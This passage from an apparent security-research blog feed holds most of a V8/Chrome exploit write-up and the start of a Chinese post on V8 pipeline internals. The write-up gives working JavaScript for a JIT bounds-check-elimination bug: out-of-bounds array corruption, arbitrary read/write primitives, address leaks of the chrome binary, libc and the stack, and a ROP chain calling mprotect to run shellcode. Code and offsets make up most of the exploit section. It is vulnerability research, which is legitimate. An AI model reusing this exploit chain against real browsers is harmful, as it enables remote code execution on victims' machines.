class="comment">// #35:SpeculativeNumberMultiply[Number](#33:SpeculativeNumberSubtract, #34:NumberConstant, #33:SpeculativeNumberSubtract, #23:Merge)  [Type: Range(0, 3)]</span></span><br><span class="line">    x += <span class="number">2</span>;<span class="comment">//解释:(2,5);编译:(2,11);</span></span><br><span class="line">    <span class="comment">// #36:NumberConstant[2]()  [Type: Range(2, 2)]</span></span><br><span class="line">    <span class="comment">// #37:SpeculativeNumberAdd[Number](#35:SpeculativeNumberMultiply, #36:NumberConstant, #35:SpeculativeNumberMultiply, #23:Merge)  [Type: Range(2, 5)]</span></span><br><span class="line">    a[x] = <span class="number">2.1729236899484e-311</span>; <span class="comment">// (1024).smi2f()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)&#123;</span><br><span class="line">  foo(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Run PoC until <code>remove checkbounds</code> is called:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">index_type.Print();</span><br><span class="line">-&gt;Range(<span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line">length_type.Print();</span><br><span class="line">-&gt;Range(<span class="number">6</span>, <span class="number">6</span>)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">                (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                 index_type.Max() &lt; length_type.Min())) </span><br><span class="line">Condition is satisfied，so it removes CheckBounds</span><br></pre></td></tr></table></figure></p><p>All in all, the result of <code>range analyzes</code> is different from the result of <code>optimized range</code>. After <code>simplified lower</code> removes boundary check, we can do OOB read/write.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Partial-OOB-read-write"><a href="#Partial-OOB-read-write" class="headerlink" title="Partial OOB read/write"></a>Partial OOB read/write</h3><p>We place <code>array a</code> next to <code>array b</code>, use OOB write from <code>a</code> to change the length of <code>array b</code>. Now, the length of <code>b</code> is <code>0x400</code>.</p><p>And we can OOB via <code>array b</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">doit</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">  <span class="keyword">let</span> b = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;<span class="comment">//-&gt;trigger JIT</span></span><br><span class="line">    foo(<span class="literal">true</span>);</span><br><span class="line">    g2[<span class="number">100</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (g2[<span class="number">12</span>] != <span class="literal">undefined</span>) <span class="keyword">break</span>;<span class="comment">//-&gt;Confirm the boundary is overwritten </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (g2[<span class="number">12</span>] == <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'g2[12] == undefined'</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-114549.png" alt=""></p><h3 id="From-Partial-OOB-R-W-to-Arbitrary-R-W-Primitive"><a href="#From-Partial-OOB-R-W-to-Arbitrary-R-W-Primitive" class="headerlink" title="From Partial OOB R/W to Arbitrary R/W Primitive"></a>From Partial OOB R/W to Arbitrary R/W Primitive</h3><p>Add a <code>Float64Array</code>. We can <strong>edit</strong> the <code>backing store</code> of <code>ArrayBuffer</code> to arbitrary R/W primitive.</p><p>We won’t create Float64Array unless the memory is in <code>g2[ab_off]</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">doit</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">let</span> b = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">  ...</span><br><span class="line">  g2 = b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ab_off = <span class="number">26</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  g4 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">7</span>);<span class="comment">//set up a Float64Array</span></span><br><span class="line">  <span class="keyword">if</span> (g2[ab_off+<span class="number">5</span>].f2smi() != <span class="number">0x38</span>n || g2[ab_off+<span class="number">6</span>].f2smi() != <span class="number">0x7</span>n) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'array buffer not at expected location'</span>;</span><br><span class="line">    <span class="comment">//byte_length is 0x38, length is 0x7</span></span><br><span class="line">    <span class="comment">//so, Float64Array is in correct location now</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-114922.png" alt=""></p><p>Find the address of array buffer backing store:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ab_backing_store_off = ab_off + <span class="number">0x15</span>;</span><br><span class="line">...</span><br><span class="line">g4[<span class="number">0</span>] = <span class="number">5.5</span>;</span><br><span class="line"><span class="keyword">if</span> (g2[ab_backing_store_off] != g4[<span class="number">0</span>]) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="string">'array buffer backing store not at expected location'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>I wonder which address records the backing store. After checking for a little while, it’s my first time to see <strong>new Float64Array() directly</strong>. Normally, it should be：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">20</span>);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(ab);</span><br></pre></td></tr></table></figure></p><p>Finding the elements of <code>Float64Array</code>.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113544.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113454.png" alt=""></p><p>Add <code>+0x10</code> to the address, we can get <code>backing store</code>.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-115204.png" alt=""></p><p>The address of elements is <code>0x0000093f18ac9ed</code>. In <code>0x0000093f18ac9ed+0x20</code>, we have the first element <code>-5.5</code>.(<code>0x4016000000000000</code> in the picture):<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113654.png" alt=""></p><p>When we edit backing store to get arbitrary r/w primitive, assume <code>addr</code> as the target address, change the value of backing store to <code>addr-0x20</code>，then we can leak content in this address.</p><h3 id="User-mode-object-leak-primitive"><a href="#User-mode-object-leak-primitive" class="headerlink" title="User mode object leak primitive"></a>User mode object leak primitive</h3><p>Appending an object to <code>g3</code>. Then, double array <code>g2</code> can leak that object, resulting type confusion. The leaked content is <code>float</code>. <code>f2i</code> is able to convert it to integer:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak_ptr</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">  g3[<span class="number">0</span>] = o;</span><br><span class="line">  <span class="keyword">let</span> ptr = g2[g3_off];</span><br><span class="line">  g3[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ptr.f2i();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Here is the output：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Array_addr = leak_ptr(<span class="built_in">Array</span>);</span><br><span class="line">print(<span class="string">'Array_addr: '</span> + Array_addr.hex());</span><br><span class="line">...</span><br><span class="line">Array_addr: <span class="number">0x93f11611259</span></span><br></pre></td></tr></table></figure></p><h3 id="Arbitrary-Address-R-W-Primitive"><a href="#Arbitrary-Address-R-W-Primitive" class="headerlink" title="Arbitrary Address R/W Primitive"></a>Arbitrary Address R/W Primitive</h3><p>Script:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readq</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> old = g2[ab_off+<span class="number">2</span>];</span><br><span class="line">  g2[ab_backing_store_off<span class="number">-2</span>] = (addr<span class="number">-0x20</span>n|<span class="number">1</span>n).i2f();</span><br><span class="line">  <span class="keyword">let</span> q = g4[<span class="number">0</span>];</span><br><span class="line">  g2[ab_off+<span class="number">2</span>] = old;</span><br><span class="line">  <span class="keyword">return</span> q.f2i();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeq</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> old = g2[ab_off+<span class="number">2</span>];</span><br><span class="line">  g2[ab_backing_store_off<span class="number">-2</span>] = (addr<span class="number">-0x20</span>n|<span class="number">1</span>n).i2f();</span><br><span class="line">  g4[<span class="number">0</span>] = val.i2f();</span><br><span class="line">  g2[ab_off+<span class="number">2</span>] = old;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Let’s have a look on <code>readq</code></p><p>We can get the original value of <code>backing store</code> form <code>g2[ab_off+2]</code>. Change it to the target address. Pay attention to the last <code>1</code>. This is a mechanism called <code>Tagged Value</code>. Only when 1 is in the last of the address can it be a valid pointer of <code>HeapObject</code>.</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113544.png" alt=""></p><p>Edit it to the content we want to read. E.g, leak the code:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-120746.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-120730.png" alt=""></p><p>I explained why we should <code>- 20</code> previously, so skip this part here:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g2[ab_backing_store_off<span class="number">-2</span>] = (addr<span class="number">-0x20</span>n|<span class="number">1</span>n).i2f();</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-121339.png" alt=""></p><p>Now the <code>backing store</code> is changed to <code>addr-0x20</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-121639.png" alt=""></p><p>We can leak code address <code>0x000001db14a8c821</code> from <code>0x0000093f11611288</code> now.</p><p>Output:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Array_addr = leak_ptr(<span class="built_in">Array</span>);</span><br><span class="line">print(<span class="string">'Array_addr: '</span> + Array_addr.hex());</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> Array_code_addr = readq(Array_addr + <span class="number">6</span>n*<span class="number">8</span>n);</span><br><span class="line">print(<span class="string">'Array_code_addr: '</span> + Array_code_addr.hex());</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Array_code_addr: <span class="number">0x1db14a8c821</span></span><br></pre></td></tr></table></figure></p><p><code>writeq</code> is the same as <code>readq</code>.</p><h3 id="Security-Feature"><a href="#Security-Feature" class="headerlink" title="Security Feature"></a>Security Feature</h3><p>Earlier than <code>version 6.7</code>, the function code is writable. Therefore, we can write shellcode to functions and call the function to execute.</p><p>Later, however, the code is not writable and we need to chain ROP.(<a href="https://github.com/v8/v8/commit/f7aa8ea00bbf200e9050a22ec84fab4f323849a7" target="_blank" rel="noopener">https://github.com/v8/v8/commit/f7aa8ea00bbf200e9050a22ec84fab4f323849a7</a>)</p><h3 id="leak-ArrayConstructor"><a href="#leak-ArrayConstructor" class="headerlink" title="leak ArrayConstructor"></a>leak ArrayConstructor</h3><p>Now, leak the address of <code>Array</code>, Then find the address of Array’s code. In the final, calculate the address of ArrayConstructor:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Array_addr = leak_ptr(<span class="built_in">Array</span>);</span><br><span class="line">print(<span class="string">'Array_addr: '</span> + Array_addr.hex());</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> Array_code_addr = readq(Array_addr + <span class="number">6</span>n*<span class="number">8</span>n);</span><br><span class="line">print(<span class="string">'Array_code_addr: '</span> + Array_code_addr.hex());</span><br><span class="line"><span class="comment">// Builtins_ArrayConstructor</span></span><br><span class="line"><span class="keyword">let</span> builtin_val = readq(Array_code_addr+<span class="number">8</span>n*<span class="number">8</span>n);</span><br><span class="line"><span class="keyword">let</span> Array_builtin_addr = builtin_val &gt;&gt; <span class="number">16</span>n;</span><br><span class="line">print(<span class="string">'Array_builtin_addr: '</span> + Array_builtin_addr.hex());</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-122341.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-122454.png" alt=""></p><h3 id="Reverse-Chrome-and-libc"><a href="#Reverse-Chrome-and-libc" class="headerlink" title="Reverse Chrome and libc"></a>Reverse Chrome and libc</h3><p>We can leak the address of <code>ArrayConstructor</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085233.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085258.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085307.jpg" alt=""></p><p>It’s mapped to the memory of chrome binary.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085402.png" alt=""></p><p>Use IDA to reverse. Seek the offset of <code>ArrayConstructor</code> in chrome binary.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x55b677f727c0-0x55b673f16000)</span><br><span class="line">&apos;0x405c7c0&apos;</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085706.png" alt=""></p><p><code>chrome binary base address</code>=<code>ArrayConstructor</code>-<code>0x405c7c0</code>. Let’s store the result in <code>bin_base</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> bin_base = Array_builtin_addr - <span class="number">0x405c7c0</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`bin base: <span class="subst">$&#123;bin_base.hex()&#125;</span>`</span>);</span><br></pre></td></tr></table></figure></p><p>Find <code>got table</code>. <code>cxa_finalize</code> is a libc function，there is a <code>got</code> in chrome pointing to it, the offset to the pointer is <code>0x8DDBDE8</code>.</p><p>Then leak <code>cxa_finalize</code>:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085836.png" alt=""></p><p>Reverse the libc.so, use <code>cxa_finalize_got</code>-<code>0x43520</code> to get the <code>base address</code> of libc:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090345.png" alt=""><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> cxa_finalize_got = bin_base + <span class="number">0x8ddbde8</span>n;</span><br><span class="line"><span class="keyword">let</span> libc_base = readq(cxa_finalize_got) - <span class="number">0x43520</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'libc base: '</span> + libc_base.hex());</span><br></pre></td></tr></table></figure></p><p>Find <code>environ</code> to leak stack address:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090537.png" alt=""><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> environ = libc_base+<span class="number">0x3ee098</span>n;</span><br><span class="line"><span class="keyword">let</span> stack_ptr = readq(environ);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`stack: <span class="subst">$&#123;stack_ptr.hex()&#125;</span>`</span>);</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090700.jpg" alt=""></p><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>This section is easy, we use <code>mprotect</code> to change the permission of memory and execute shellcode:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">let</span> nop = bin_base+<span class="number">0x263d061</span>n;</span><br><span class="line">  <span class="keyword">let</span> pop_rdi = bin_base+<span class="number">0x264bdcc</span>n;</span><br><span class="line">  <span class="keyword">let</span> pop_rsi = bin_base+<span class="number">0x267e82e</span>n;</span><br><span class="line">  <span class="keyword">let</span> pop_rdx = bin_base+<span class="number">0x26a8d66</span>n;</span><br><span class="line">  <span class="keyword">let</span> mprotect = bin_base+<span class="number">0x88278f0</span>n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> sc_array = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">2048</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.length; i++) &#123;</span><br><span class="line">    sc_array[i] = sc[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> sc_addr = readq((leak_ptr(sc_array)<span class="number">-1</span>n+<span class="number">0x68</span>n));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`sc_addr: <span class="subst">$&#123;sc_addr.hex()&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> rop = [</span><br><span class="line">    pop_rdi,</span><br><span class="line">    sc_addr,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">4096</span>n,</span><br><span class="line">    pop_rdx,</span><br><span class="line">    <span class="number">7</span>n,</span><br><span class="line">    mprotect,</span><br><span class="line">    sc_addr</span><br><span class="line">  ];</span><br><span class="line">  <span class="keyword">let</span> rop_start = stack_ptr - <span class="number">8</span>n*BigInt(rop.length);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; rop.length; i++) &#123;</span><br><span class="line">    writeq(rop_start+<span class="number">8</span>n*BigInt(i), rop[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">    rop_start -= <span class="number">8</span>n;</span><br><span class="line">    writeq(rop_start, nop);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>The addresses in red rectangle is environment variable, and the contents in yellow rectangle are <code>0x200*retn</code>, <strong>variable <code>nop</code> here represents <code>retn</code> instruction but not 0x90</strong>(<code>nop</code> instruction), we the code executes <code>retn</code>，it will keep returning until executing our ROP。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">  rop_start -= <span class="number">8</span>n;</span><br><span class="line">  writeq(rop_start, nop);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090853.png" alt=""></p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/chrome</span><br><span class="line">./chrome index.html</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091400.jpg" alt=""></p><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><h3 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h3><p>I would acknowledge stephen(@_tsuro) who guides me and points out my stupid mistakes.<br>Debugging d8 is quite different from chrome，when leaking cxa，it will map builtin to a random address，and cxa is mapped to libv8.so，so we cannot find offset via cxa.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091930.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091917.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091900.png" alt=""><br>When you complete a arbitrary r/w primitive in v8，you can exploit chrome via the script without additional debug（yes, u don’t need to debug a full chrome)</p><p>Thanks Auxy(@realAuxy233) for translating~<br>If you find any errors or corrections, contact me. </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/google/google-
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>v8 pipeline</title>
    <link href="http://eternalsakura13.com/2018/09/05/pipeline/"/>
    <id>http://eternalsakura13.com/2018/09/05/pipeline/</id>
    <published>2018-09-05T03:33:05.350Z</published>
    <updated>2018-10-22T14:25:51.720Z</updated>
    
    <content type="html"><![CDATA[<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v8::internal::GeneratedCode</span><br><span class="line">    -&gt; RUNTIME_FUNCTION(Runtime_CompileOptimized_NotConcurrent)</span><br><span class="line">        -&gt; Compiler::CompileOptimized</span><br><span class="line">            -&gt; GetOptimizedCode</span><br><span class="line">                -&gt; GetOptimizedCodeNow</span><br><span class="line">                    -&gt; OptimizedCompilationJob::PrepareJob</span><br><span class="line">                        -&gt; PipelineCompilationJob::Status PipelineCompilationJob::PrepareJobImpl</span><br><span class="line">                            -&gt; PipelineImpl::CreateGraph()</span><br><span class="line">                                -&gt; BytecodeGraphBuilder::CreateGraph()</span><br><span class="line">                                ...</span><br><span class="line">                                  -&gt; SetStart</span><br><span class="line">                                    -&gt; NewNodeUnchecked</span><br><span class="line">                                      -&gt; Node::New</span><br><span class="line">                                ...</span><br><span class="line">                                  -&gt; env</span><br><span class="line">                                  -&gt; VisitBytecodes</span><br></pre></td></tr></table></figure><h3 id="Compiler-CompileOptimized-function-ConcurrencyMode-kNotConcurrent"><a href="#Compiler-CompileOptimized-function-ConcurrencyMode-kNotConcurrent" class="headerlink" title="Compiler::CompileOptimized(function, ConcurrencyMode::kNotConcurrent)"></a>Compiler::CompileOptimized(function, ConcurrencyMode::kNotConcurrent)</h3><p>参数1是要compile的function，参数2是一个标志,应该是和线程相关，表示function不在“正在编译的函数的队列”里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (mode == ConcurrencyMode::kConcurrent) &#123;</span><br><span class="line">  if (GetOptimizedCodeLater(job.get(), isolate)) &#123;</span><br><span class="line">    job.release();  // The background recompile job owns this now.</span><br><span class="line"></span><br><span class="line">    // Set the optimization marker and return a code object which checks it.</span><br><span class="line">    function-&gt;SetOptimizationMarker(OptimizationMarker::kInOptimizationQueue);</span><br><span class="line">    DCHECK(function-&gt;IsInterpreted() ||</span><br><span class="line">           (!function-&gt;is_compiled() &amp;&amp; function-&gt;shared()-&gt;IsInterpreted()));</span><br><span class="line">    DCHECK(function-&gt;shared()-&gt;HasBytecodeArray());</span><br><span class="line">    return BUILTIN_CODE(isolate, InterpreterEntryTrampoline);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>在这个函数中进行编译，这个函数首先检查function是否已经被编译过了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (function-&gt;IsOptimized()) return true;</span><br></pre></td></tr></table></figure></p><p>然后进行编译优化，如果编译优化成功则以后在js中调用函数都执行编译后的code<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (!GetOptimizedCode(function, mode).ToHandle(&amp;code)) &#123;</span><br><span class="line">    ...</span><br><span class="line">// Install code on closure.</span><br><span class="line">function-&gt;set_code(*code);</span><br></pre></td></tr></table></figure></p><p>如果失败，则回到解释帧InterpreterEntryTrampoline执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code = BUILTIN_CODE(isolate, InterpreterEntryTrampoline);</span><br></pre></td></tr></table></figure></p><h3 id="bool-GetOptimizedCodeNow-OptimizedCompilationJob-job-Isolate-isolate"><a 